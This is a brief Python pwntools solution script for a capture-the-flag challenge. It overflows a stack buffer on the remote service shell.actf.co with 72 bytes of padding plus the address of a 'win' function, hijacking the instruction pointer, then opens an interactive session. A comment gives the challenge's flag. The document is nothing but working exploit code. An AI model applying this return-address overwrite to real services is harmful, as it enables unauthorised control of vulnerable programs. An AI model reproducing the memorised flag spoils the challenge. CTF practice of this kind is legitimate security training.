from pwn import *

#actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}

r = remote('shell.actf.co', 21830)

r.recv()
win = 0x401196
r.sendline(b'a'*72 + p64(win))
r.interactive()
